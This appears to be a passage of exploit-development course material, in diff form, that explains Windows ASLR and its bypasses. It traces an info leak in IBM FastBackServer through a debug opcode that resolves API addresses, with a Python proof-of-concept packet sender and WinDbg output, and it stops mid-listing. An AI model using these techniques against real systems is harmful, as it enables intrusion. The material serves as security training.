+ROP evolved over time to make many basic stack buffer overflow vulnerabilities, previously considered un-exploitable because of DEP, exploitable. The goal of ASLR was to mitigate exploits that defeat DEP with ROP.
+At a high level, ASLR defeats ROP by randomizing an EXE or DLL's loaded address each time the application starts. In the next sections, we'll examine how Windows implements ASLR and in later sections we'll discuss various bypass techniques.
+1 (Wikipedia, 2020), https://en.wikipedia.org/wiki/PaX
+10.1.1. ASLR Implementation
+To fully describe how Windows implements ASLR, we must briefly discuss basic executable file compilation theory.
+When compiling an executable, the compiler accepts a parameter called the preferred base address (for example 0x10000000), which sets the base memory address of the executable when it is loaded.
+We should also take note of a related compiler flag called /REBASE, which if supplied, allows the loading process to use a different loading address. This flag is relevant if two DLLs were compiled with the same preferred base address and loaded into the same process.
+If, as in our example, the first module uses 0x10000000, the operating system will provide an alternative base address for the second module. This is not a security mechanism, but merely a feature to avoid address collision.
+To enable ASLR, a second compiler flag, /DYNAMICBASE must be set. This is set by default in modern versions of Visual Studio, but may not be set in other IDEs or compilers.
+Now that we've discussed how ASLR is enabled, let's discuss how it works.
+Within Windows, ASLR is implemented in two phases. First, when the operating system starts, the native DLLs for basic SYSTEM processes load to randomized base addresses. Windows will automatically avoid collisions by rebasing modules as needed. The addresses selected for these native modules are not changed until the operating system restarts.
+Next, when an application is started, any ASLR-enabled EXE and DLLs that are used are allocated to random addresses. If this includes a DLL loaded at boot as part of a SYSTEM process, its existing address is reused within this new application.
+It is important to note that ASLR's randomization does not affect all the bits of the memory base address. Instead, only 8 of the 32 bits are randomized when a base address is chosen.1 In technical terms, this is known as the amount of entropy2 applied to the memory address. The higher 8 bits and the lower 16 bits always remain static when an executable loads.
+On 64-bit versions of Windows, ASLR has a larger entropy (up to 19 bits) and is therefore considered to be more effective.
+Armed with a basic understanding of ASLR implementation, let's discuss ASLR bypasses.
+1 (BlackHat, 2012), https://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf
+2 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Address_space_layout_randomization
+10.1.2. ASLR Bypass Theory
+There are four main techniques for bypassing ASLR; we could either exploit modules that are compiled without ASLR, exploit low entropy, brute force a base address, or leverage an information leak. In this section, we'll discuss each of these approaches.
+The first technique mentioned above is the simplest. As previously mentioned, ASLR must be enabled for each module during compilation. If an EXE or DLL is compiled without ASLR support, its image will be loaded to its preferred base address, provided that there are no collision issues. This means that, in these cases, we can locate gadgets for our ROP chain in an unprotected module and leverage that module to bypass DEP.
+Many third-party security solutions attempt to protect processes by injecting monitoring routines into them. Ironically, quite a few of these products have historically injected DLLs that were compiled without ASLR, thus effectively lowering the application's security posture.
+We can easily determine whether a module is compiled with ASLR by searching for the /DYNAMICBASE bit inside the DllCharacteristics field of the PE header. Let's demonstrate this with the Narly WinDbg.
+As an example, let's start Notepad.exe and attach WinDbg. Listing 1 shows the output received when we execute the !nmod command.
+0:006> .load narly
+...
 
-```nasm
+0:006> !nmod
+00850000 0088f000 notepad              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\notepad.exe
+674a0000 674f6000 oleacc               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\oleacc.dll
+68e60000 68ed6000 efswrt               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\efswrt.dll
+69d70000 69ddc000 WINSPOOL             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\WINSPOOL.DRV
+6a600000 6a617000 MPR                  /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\MPR.dll
+6ba10000 6baf3000 MrmCoreR             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\MrmCoreR.dll
+6d3d0000 6d55c000 urlmon               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\urlmon.dll
+...
+Listing 1 - Listing ASLR support for loaded modules
+The output of the Narly plugin shows that by default, the modules used in Notepad have all been compiled with ASLR. This is true of most native Windows applications.
+Many early ASLR bypasses leveraged non-ASLR modules. This was even effective against browsers due to the widespread presence of Java version 6, which contained a DLL compiled without ASLR (msvcr71.dll).
+Today, most major applications use ASLR-compiled modules. However, unprotected modules are more common in less-popular applications and in-house applications.
+A second ASLR bypass technique leverages low entropy. In these cases, since the lower 16 bits of a memory address are non-randomized, we may be able to perform a partial overwrite of a return address while exploiting a stack overflow condition.
+This technique leverages the fact that the CPU reads the address of an instruction in little-endian format, while data is often read and written in big-endian format.
+For example, assume 0x7F801020 is a hypothetical return address for a function vulnerable to a buffer overflow. Although the address would be stored on the stack as the bytes 0x20, 0x10, 0x80, 0x7F, in that order, the CPU would read the address as 0x7F801020.
+Imagine that we are able to leverage a buffer overflow where the ESP register points to our payload on the stack. In addition, let's assume we found a JMP ESP instruction within the same DLL the vulnerable function belongs to, at address 0x7F801122.
+If we control the overflow in such a way that we overwrite only the first two bytes of the return address with the values 0x11 and 0x22, the CPU will process the partially-overwritten address as 0x7F801122. This would effectively transfer the execution to our JMP ESP when the function returns, eventually running our shellcode.
+Although interesting, this ASLR bypass has some limitations. First, as already mentioned, we'd need to redirect the execution to an instruction or gadget within the same DLL the return address belongs to. In addition, because we only perform a partial overwrite of the return address, we're limited to that single gadget, meaning our buffer overflow would halt immediately after executing it. Finally, to be effective, this technique also requires that the target application is compiled with ASLR, but without DEP, which is rare.
+Another ASLR bypass approach is to brute force the base address of a target module. This is possible on 32-bit because ASLR provides only 8 bits of entropy. The main limitation is that this only works for target applications that don't crash when encountering an invalid ROP gadget address or in cases in which the application is automatically restarted after the crash.
+If the application does not crash, we can brute force the base address of a target module in (at most) 256 attempts. If the application is restarted, it may take more attempts to succeed, but the attack is still feasible.
+As an example, let's consider a stack buffer overflow in a web server application. Imagine that every time we submit a request, a new child process is created. If we send our exploit and guess the ROP gadget's base address incorrectly, the child process crashes, but the main web server does not. This means we can submit further requests until we guess correctly.
+Although this technique theoretically works against 32-bit applications, it is considered a special case and is ineffective in many situations. Nevertheless, this technique can still be useful, and we'll demonstrate a variant of it later in this module.
+The fourth and final technique we'll cover, which is used in many modern exploits, leverages an information leak (or "info leak"). In simple terms, this technique leverages one or more vulnerabilities in the application to leak the address of a loaded module.
+Info leaks are often created by exploiting a separate vulnerability (like a logic bug) that discloses memory or information but does not permit code execution. Once we have bypassed ASLR by leaking a module's address, we could leverage another vulnerability such as a stack buffer overflow to gain code execution while bypassing DEP through a ROP chain.
+In addition, there are certain types of vulnerabilities (such as format string vulnerabilities) that can be leveraged to both trigger an info leak and execute code.
+In this section, we explored four theoretical techniques for bypassing ASLR. Next, we'll discuss how to implement some of them.
+10.1.3. Windows Defender Exploit Guard and ASLR
+In this module, we are going to revisit the FastBackServer application and expand and improve on an exploit from a previous module.
+Note that if your Windows 10 machine has been reverted, you must re-install FastBackServer before continuing.
+Let's start by attaching WinDbg to FastBackServer. We'll use Narly to find information related to compiled security mitigations.
+0:078> !nmod
+00190000 001c3000 snclientapi          /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\snclientapi.dll
+001d0000 001fd000 libcclog             /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\libcclog.dll
+00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
+011e0000 0120b000 gsk8iccs             /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll
+01340000 01382000 NLS                  /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\Common\NLS.dll
+01390000 013ca000 icclib019            /SafeSEH ON  /GS            C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll
+03170000 03260000 libeay32IBM019       /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll
+10000000 1003d000 SNFS                 /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\SNFS.dll
+50200000 50237000 CSNCDAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL
+50500000 50577000 CSFTPAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL
+51000000 51032000 CSMTPAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL
+57a40000 57ae3000 MSVCR90              /SafeSEH ON  /GS *ASLR *DEP 
+62830000 62866000 IfsUtil              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\IfsUtil.dll
+63550000 63577000 ulib                 /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ulib.dll
+...
+Listing 2 - Lack of ASLR in FastBackServer
+We find that neither the main executable nor any of the IBM DLLs are compiled with ASLR, as shown in Listing 2.
+To learn more about how to bypass DEP and ASLR, we are going to use Windows Defender Exploit Guard (WDEG) to enable these mitigations for the IBM target executable and DLLs.
+Introduced in the Windows 10 Creators Update, WDEG enables the enforcement of additional security mitigations such as DEP and ASLR, even if they were not intended by the developer.
+To use WDEG, we'll search for and open Windows Defender Security Center, as displayed in Figure 1.
+ 
+Figure 1: Searching for Windows Defender Security Center
+In the new window, we can open App & browser control, scroll to the bottom, and click Exploit protection settings to open the main WDEG window.
+ 
+Figure 2: WDEG main Window
+To select mitigations for a single application, we'll click the Program settings tab, click Add program to customize, and select Choose exact file path, as shown in Figure 3.
+ 
+Figure 3: Selecting application to protect
+In the file dialog window, we'll navigate to C:\Program Files\Tivoli\TSM\FastBack\server and select FastBackServer.exe. In the new settings menu, we'll scroll down and enable "Data Execution Prevention (DEP)" by checking Override system settings:
+ 
+Figure 4: Enabling DEP for FastBackServer
+Next, we'll scroll down to "Force randomization for images (Mandatory ASLR)" and enable it by checking Override system settings and turning it On, as shown in Figure 5.
+ 
+Figure 5: Enabling ASLR for FastBackServer
+Finally, we'll accept the settings and restart the FastBackServer to enable our changes.
+Because Narly only presents information parsed from the DllCharacteristics field of the PE header of the modules, rerunning it would not show that DEP and ASLR were enabled.
+To manually verify that ASLR is enabled, we can dump the base address of the loaded modules using the lm command and note the addresses. Once we restart the service, reattach WinDbg, and dump the base address of the loaded modules again, we can note if the base addresses have changed.
+As an example, we'll select the csftpav6 module. Listing 3 shows the loaded base address of csftpav6.dll across three application restarts performed in separate WinDbg instances.
+0:077> lm m csftpav6
+Browse full module list
+start    end        module name
+01050000 010c7000   CSFTPAV6   (deferred)  
 
-```
+0:079> lm m csftpav6
+Browse full module list
+start    end        module name
+01130000 011a7000   CSFTPAV6   (deferred)  
 
-```nasm
+0:066> lm m csftpav6
+Browse full module list
+start    end        module name
+01060000 010d7000   CSFTPAV6   (deferred) 
+Listing 3 - Base address of csftpav6 across restart
+This confirms that our ASLR enforcement was successfully implemented, meaning that our exploit must now effectively bypass ASLR.
+When forcing ASLR with WDEG, it is not applied to the main executable, in our case FastBackServer.exe. However, because FastBackServer.exe loads at a preferred base address containing a NULL byte, we cannot use it with memory corruption vulnerabilities for which NULL bytes are bad characters.
+Exercises
+1.	Verify that ASLR is not enabled for the IBM DLLs.
+2.	Use WDEG to force ASLR protection on all modules in the FastBackServer process, as shown in this section.
+10.2. Finding Hidden Gems
+Info leaks are often discovered through a logical vulnerability or through memory corruption, the latter of which enables the reading of unintended memory, such as out-of-bounds stack memory.
+Discovering a vulnerability that can be leveraged as an info leak usually requires copious reverse engineering, but we can speed up our analysis through educated guesses and various searches.
+Our aim in this module is to exploit a logical vulnerability in the FastBackServer application. The most comprehensive approach for discovering a vulnerability would be to reverse engineer the code paths for each valid opcode inside the huge FXCLI_OraBR_Exec_Command function, which we located in a prior module.
+However, we might be able to find useful information more quickly by exploring the Win32 APIs imported by the application. If an imported API could lead to an info leak and that function is likely being used somewhere in the application, we may be able to exploit it.
+Most Win32 APIs do not pose a security risk but a few can be directly exploited to generate an info leak. These include the DebugHelp APIs1 (from Dbghelp.dll), which are used to resolve function addresses from symbol names.
+Similar APIs are CreateToolhelp32Snapshot2 and EnumProcessModules.3 Additionally, an C runtime API like fopen4 can be be used as well.
+In this module, we will locate and leverage a "hidden gem" left behind by the developer.
+1 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/debug/dbghelp-functions
+2 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
+3 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules
+4 (Cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fopen/
+10.2.1. FXCLI_DebugDispatch
+Let's begin our investigation of the imported Win32 APIs by opening our previously-analyzed version of FastBackServer.exe in IDA Pro.
+We'll navigate to the Imports tab and scroll through all the imported APIs. Eventually, we will find SymGetSymFromName,1 shown in Figure 6.
+ 
+Figure 6: Locating SymGetSymFromName in Imports tab
+This API is particularly interesting since it can be used to resolve the memory address of any exported Win32 API by supplying its name.
+We don't have enough information yet to determine whether the import of this API poses a security risk. First, let's determine if we can invoke the API by sending a network packet.
+Let's double-click on the imported API to continue our analysis in IDA Pro. This leads us to its entry inside the .idata section, as shown in Figure 7.
+ 
+Figure 7: SymGetSymFromName import in .idata section
+Next, we'll perform a cross-reference of the API using the X hotkey, which displays the two results shown in Figure 8.
+ 
+Figure 8: Cross reference on SymGetSymFromName
+Since both these addresses are the same, we know that this API is only used once. We can double-click on either address to jump to the basic block where the API is invoked, as displayed in Figure 9.
+ 
+Figure 9: Basic block responsible for invoking SymGetSymFromName
+Our goal is to use static analysis to determine if we can send a network packet to reach this basic block. We'll need to find an execution path from FXCLI_OraBR_Exec_Command to the SymGetSymFromName API based on the opcode we provide.
+To speed up our initial discovery process we'll perform a backward analysis. We'll first cross-reference the involved function calls, ignoring, for now, individual instructions and branching statements inside the current function.
+We can begin the analysis by locating the beginning of the current function. Figure 10 shows the graph overview.
+ 
+Figure 10: Graph layout of current function
+This is a large function, which is worth keeping in mind when we return to it later.
+Clicking on the upper left-hand side of the graph overview reveals the start of the function and its name, which is FXCLI_DebugDispatch, as shown in Figure 11.
+ 
+Figure 11: Start of function FXCLI_DebugDispatch
+Next, we'll perform a cross-reference by clicking on the highlighted section and pressing X to find which functions call it.
+ 
+Figure 12: Cross reference of FXCLI_DebugDispatch
+The cross-reference results reveal a single function, FXCLI_OraBR_Exec_Command.
+If we double-click on the search result, we jump to the basic block that calls FXCLI_DebugDispatch, as shown in Figure 13.
+ 
+Figure 13: Start of function FXCLI_DebugDispatch
+We now know that FXCLI_DebugDispatch is called from FXCLI_OraBR_Exec_Command. Next we must determine which opcode triggers the correct code path.
+Moving up one basic block, we discover the comparison instruction shown in Figure 14.
+ 
+Figure 14: FXCLI_DebugDispatch is reached from opcode 0x2000
+As displayed in the above figure, the code compares the value 0x2000 and a DWORD at an offset from EBP. As discussed in previous modules, this offset is used to specify the opcode.
+This is definitely a good start since now we know that the opcode value of 0x2000 will trigger the correct code path, but we have not yet determined the buffer contents required to reach the correct basic block inside FXCLI_DebugDispatch.
+Our next goal is to develop a proof of concept that will trigger the SymGetSymFromName call inside FXCLI_DebugDispatch. We'll reuse our basic proof of concept from the previous modules, and update the opcode value.
+import socket
+import sys
+from struct import pack
 
-```
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x2000)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
 
-```nasm
+# psCommandBuffer
+buf += b"A" * 0x100
+buf += b"B" * 0x100
+buf += b"C" * 0x100
 
-```
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
 
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
 
-```nasm
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
 
-```
+	s.send(buf)
+	s.close()
 
+	print("[+] Packet sent")
+	sys.exit(0)
 
-```nasm
 
-```
+if __name__ == "__main__":
+ 	main()
+Listing 4 - Basic proof of concept to reach opcode 0x2000
+Our modified proof of concept uses the opcode value 0x2000 along with a psCommandbuffer consisting of 0x100 As, Bs, and Cs, as displayed in Listing 4.
+Since WinDbg is already attached to FastBackServer, we can place a breakpoint on the comparison of the opcode value. Because WDEG cannot randomize the base address of FastBackServer, we can continue using the static addresses found in IDA Pro for our breakpoint.
+Next, let's launch our proof of concept.
+0:067> bp 0x56d1ef
 
+0:067> g
+Breakpoint 0 hit
+eax=0609c8f0 ebx=0609c418 ecx=00002000 edx=00000001 esi=0609c418 edi=00669360
+eip=0056d1ef esp=0d47e334 ebp=0d4dfe98 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+FastBackServer!FXCLI_OraBR_Exec_Command+0xd39:
+0056d1ef 81bdd0e4f9ff00200000 cmp dword ptr [ebp-61B30h],2000h ss:0023:0d47e368=00002000
+Listing 5 - Breaking at opcode 0x2000 comparison
+From the highlighted values in Listing 5, it is evident that our proof of concept and prior analysis were correct. We have reached the branching statement leading to the code path of opcode 0x2000.
+We can now single-step through the comparison to the call into FXCLI_DebugDispatch. We'll dump the arguments here, as shown in Listing 6.
+eax=0d4d3b30 ebx=0609c418 ecx=018e43a8 edx=0d4d3b2c esi=0609c418 edi=00669360
+eip=0057381c esp=0d47e328 ebp=0d4dfe98 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!FXCLI_OraBR_Exec_Command+0x7366:
+0057381c e85fa30000      call    FastBackServer!FXCLI_DebugDispatch (0057db80)
 
-```nasm
+0:006> dd esp L3
+0d47e328  018e43a8 0d4d3b30 0d4d3b2c
 
-```
+0:006> dd 0d4d3b30 
+0d4d3b30  41414141 41414141 41414141 41414141
+0d4d3b40  41414141 41414141 41414141 41414141
+0d4d3b50  41414141 41414141 41414141 41414141
+0d4d3b60  41414141 41414141 41414141 41414141
+0d4d3b70  41414141 41414141 41414141 41414141
+0d4d3b80  41414141 41414141 41414141 41414141
+0d4d3b90  41414141 41414141 41414141 41414141
+0d4d3ba0  41414141 41414141 41414141 41414141
+Listing 6 - psCommandBuffer as argument to FXCLI_DebugDispatch
+The first part of psCommandBuffer consists of 0x41s. This means that the second argument to FXCLI_DebugDispatch is under our control.
+In summary, we discovered that the target application uses the SymGetSymFromName API, which we may be able to leverage to bypass ASLR. We also created a proof of concept enabling us to reach the function that invokes SymGetSymFromName.
+In the next section, we'll navigate FXCLI_DebugDispatch to determine how we can resolve the address of an arbitrary Win32 API.
+Exercises
+1.	Repeat the analysis that leads to locating FXCLI_DebugDispatch.
+2.	Craft a proof of concept that allows you to call FXCLI_DebugDispatch.
+1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname
+10.2.2. Arbitrary Symbol Resolution
+Now, we're ready to step into FXCLI_DebugDispatch to determine how to reach the correct basic block.
+As mentioned, FXCLI_DebugDispatch is a large function. The graph overview from IDA Pro is repeated in Figure 10.
+ 
+Figure 15: Graph layout of FXCLI_DebugDispatch
+The figure above also reveals many branching statements within the function. These types of branching code paths are typically the result of if and else statements in the C source code.
+When we start to trace through the function, we discover a repeating pattern that begins from the first basic block.
+The code of the first basic block from FXCLI_DebugDispatch is shown in Figure 16.
+ 
+Figure 16: First basic block of FXCLI_DebugDispatch
+In the first highlighted portion of the basic block, FXCLI_DebugDispatch calls _ml_strbytelen. This is a wrapper function around strlen,1 a function that finds the length of the string given as an argument.
+The argument string in this case is "help", which means _ml_strbytelen should return the value "4".
+Next, FXCLI_DebugDispatch calls _ml_strnicmp, which is a wrapper around strnicmp.2 This API compares two strings up to a maximum number of characters, ignoring the case.
+In our case, the maximum number of characters to compare is the result of the _ml_strbytelen function, which is the value "4". That means _ml_strnicmp performs a comparison between "help" and the contents at the memory address in Str1.
+We can verify our static analysis and obtain the contents of the unknown string by single-stepping until the call to ml_strnicmp and inspecting the API's three arguments:
+eax=0d4d3b30 ebx=0609c418 ecx=0085dbe4 edx=7efefeff esi=0609c418 edi=00669360
+eip=0057dbae esp=0d47da30 ebp=0d47e320 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!FXCLI_DebugDispatch+0x2e:
+0057dbae e8c4d40d00      call    FastBackServer!ml_strnicmp (0065b077)
 
+0:006> dd esp L3
+0d47da30  0d4d3b30 0085dbec 00000004
 
-```nasm
+0:006> da 0085dbec 
+0085dbec  "help"
 
-```
+0:006> da 0d4d3b30 
+0d4d3b30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d4d3c30  ""
+Listing 7 - String compare operation on our input
+The output confirms that the maximum size argument contains the value "4". We also observe that the dynamic string comes from the psCommandBuffer, which is under our control.
+Since the first four characters of the strings do not match, the API returns a non-zero value:
+0:006> r eax
+eax=ffffffff
 
+0:006> p
+eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360
+eip=0057dbb6 esp=0d47da3c ebp=0d47e320 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!FXCLI_DebugDispatch+0x36:
+0057dbb6 85c0            test    eax,eax
 
+0:006> p
+eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360
+eip=0057dbb8 esp=0d47da3c ebp=0d47e320 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
+FastBackServer!FXCLI_DebugDispatch+0x38:
+0057dbb8 0f85fd010000    jne     FastBackServer!FXCLI_DebugDispatch+0x23b (0057ddbb) [br=1]
+Listing 8 - Comparison and jump due to string compare
+The return value is used in a TEST instruction, along with a JNE. Because the return value is non-zero, we execute the jump.
+From here, the ml_strnicmp call we have just analyzed is repeated for different strings in a series of if and else statements visually represented in the graph overview. Figure 17 shows the next two string comparisons.
+ 
+Figure 17: String comparisons
+As we will soon confirm, these basic assembly blocks can be translated to a series of branch statements in C. When each string comparison succeeds, it leads to the invocation of a FastBackServer internal function.
+Now that we understand the high level flow of the function, let's speed up our analysis by navigating to the basic block just prior to the SymGetSymFromName call. Here we find the comparison shown in Figure 18.
+ 
+Figure 18: First basic block of FXCLI_DebugDispatch
+Based on the comparison, we know that our input string must be equal to "SymbolOperation".
+We can pass the comparison by updating our proof of concept, as shown in Listing 9.
+...
+# psCommandBuffer
+buf += b"SymbolOperation"
+buf += b"A" * (0x100 - len("SymbolOperation"))
+buf += b"B" * 0x100
+buf += b"C" * 0x100
+...
+Listing 9 - Updated input buffer to pass comparison
+We'll set the input buffer to the string "SymbolOperation" followed by A's.
+Next, we'll clear any previous breakpoints in WinDbg, set a breakpoint on the call to ml_strnicmp at 0x57e84a, and continue execution. We'll reach the breakpoint we just set with old data from our previous proof of concept, so we need to continue execution once more before launching the updated proof of concept.
+When the updated proof of concept is executed, we trigger the breakpoint.
+Breakpoint 0 hit
+eax=0000000f ebx=0602bd30 ecx=0085e930 edx=0d563b30 esi=0602bd30 edi=00669360
+eip=0057e84a esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!FXCLI_DebugDispatch+0xcca:
+0057e84a e828c80d00      call    FastBackServer!ml_strnicmp (0065b077)
 
-```nasm
+0:001> da poi(esp)
+0d563b30  "SymbolOperationAAAAAAAAAAAAAAAAA"
+0d563b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d563b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d563b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d563bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d563bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d563bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d563c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d563c30  ""
 
-```
+0:001> p
+eax=00000000 ebx=0602bd30 ecx=00000000 edx=0d562030 esi=0602bd30 edi=00669360
+eip=0057e84f esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+FastBackServer!FXCLI_DebugDispatch+0xccf:
+0057e84f 83c40c          add     esp,0Ch
 
+0:001> r eax
+eax=00000000
+Listing 10 - Passing string comparison
+Since we submitted the correct string, the TEST instruction will ensure we take the code path leading to the SymGetSymFromName call.
+Let's set a breakpoint on the call to SymGetSymFromName at 0x57e984 and continue execution.
+0:001> bp 0057e984
 
-```nasm
+0:001> g
+Breakpoint 1 hit
+eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360
+eip=0057e984 esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
+FastBackServer!FXCLI_DebugDispatch+0xe04:
+0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName (0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)}
+Listing 11 - Call to SymGetSymFromName
+As shown in the listing, our proof of concept reaches the call to SymGetSymFromName. Next, we need to understand its arguments so we can resolve a function address.
+Let's review the function prototype3 (shown in Listing 12).
+BOOL IMAGEAPI SymGetSymFromName(
+  HANDLE           hProcess,
+  PCSTR            Name,
+  PIMAGEHLP_SYMBOL Symbol
+);
+Listing 12 - Function prototype for SymGetSymFromName
+Specifically, we'll explore the last two arguments. The second argument, Name, is a pointer to the symbol name that will be resolved. It must be provided as a null-terminated string.
+We can check the current content of the second argument with WinDbg.
+eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360
+eip=0057e984 esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
+FastBackServer!FXCLI_DebugDispatch+0xe04:
+0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName (0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)}
 
-```
+0:079> da poi(esp+4)
+0d50da8c  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d50daac  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+...
+Listing 13 - Second argument for SymGetSymFromName
+From Listing 13, we discover that the second argument is our input string that was appended to the "SymbolOperation" string.
+This means we can provide the name of an arbitrary Win32 API and have its address resolved by SymGetSymFromName. Very nice.
+The last argument is a structure of type PIMAGEHLP_SYMBOL,4 as shown in Listing 14.
+typedef struct _IMAGEHLP_SYMBOL {
+  DWORD SizeOfStruct;
+  DWORD Address;
+  DWORD Size;
+  DWORD Flags;
+  DWORD MaxNameLength;
+  CHAR  Name[1];
+} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;
+Listing 14 - IMAGEHLM_SYMBOL structure
+This structure is initialized within the same basic block (address 0x57E957) and populated by SymGetSymFromName. We are interested in the second field of this structure, which will contain the resolved API's memory address returned by SymGetSymFromName. If all goes well, we'll later use this address to bypass ASLR.
+Let's try to resolve the memory address of an API by updating our proof of concept to contain the name of the Win32 WriteProcessMemory API, which we can use to bypass DEP.
+# psCommandBuffer
+symbol = b"SymbolOperationWriteProcessMemory" + b"\x00"
+buf += symbol + b"A" * (100 - len(symbol))
+buf += b"B" * 0x100
+buf += b"C" * 0x100
+Listing 15 - Updated proof of concept with WriteProcessMemory function name
+We'll remove the breakpoint on the call to ml_strnicmp at 0x57e84a and let execution continue. Now we're ready to execute the updated proof of concept.
+0:077> bc 0
 
+0:077> g
+Breakpoint 0 hit
+eax=ffffffff ebx=0608c418 ecx=0db5da8c edx=0db5dca0 esi=0608c418 edi=00669360
+eip=0057e984 esp=0db5da30 ebp=0db5e320 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
+FastBackServer!FXCLI_DebugDispatch+0xe04:
+0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName (0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)}
 
-```nasm
+0:079> da poi(esp+4)
